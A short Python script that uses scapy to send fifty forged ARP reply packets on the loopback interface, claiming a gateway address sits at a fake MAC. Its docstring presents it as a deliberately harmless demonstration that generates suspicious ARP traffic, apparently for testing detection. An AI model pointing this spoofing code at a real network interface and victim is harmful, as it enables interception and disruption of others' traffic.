#!/usr/bin/env python

""" This tool performs a (very silly) attempt at ARP cache poisoning. Although
    the poisoning attempt is not strictly valid (what with deadbeefcafe not
    being a real place) it does generate suspicious ARP packets for us. """

from scapy.all import *
import time

operation = 2        # 2 specifies ARP Reply
victim = '127.0.0.1' # We're poisoning our own cache for this demonstration
spoof = '192.168.1.1' # We are trying to poison the entry for this IP
mac = 'de:ad:be:ef:ca:fe' # Silly mac address

arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2,            
    psrc=spoof,     
    pdst=victim,    
    hwsrc=mac      
)


print("Flooding ARP replies, can stop with ctrl-c")

for i in range(50):
    sendp(arp_reply, iface="lo", verbose=False)
    time.sleep(0.1)  # 10 ARP replies per second
print("finished")
